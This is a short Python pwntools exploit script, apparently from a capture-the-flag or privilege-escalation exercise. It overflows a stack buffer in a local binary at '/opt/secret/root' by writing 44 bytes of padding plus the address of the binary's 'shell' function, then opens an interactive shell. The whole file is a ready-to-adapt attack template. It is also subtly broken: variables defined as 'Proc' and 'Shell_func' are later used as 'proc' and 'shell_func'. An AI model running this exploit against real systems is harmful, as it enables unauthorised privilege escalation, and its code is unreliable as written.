from pwn import *

# to check whether an ELF program is susceptible to bufferstack overflow
# to be run in the affected machine
# need to accompany the tool with `pwndbg` in which can input a command `r < <(cyclic 50)` for 50 characters
# by executing `cyclic -l <0xEIP_ADDRESS> in the BACKTRACE may provide us with the number of chars needed 
#

Proc = process('/opt/secret/root') # input the ELF Path 
elf = ELF('/opt/secret/root')
Shell_func = elf.symbols.shell
payload = fit({
    44: shell_func # change accordingly to know many characters to cause bufferstack overflow
})

proc.sendline(payload)
proc.interactive()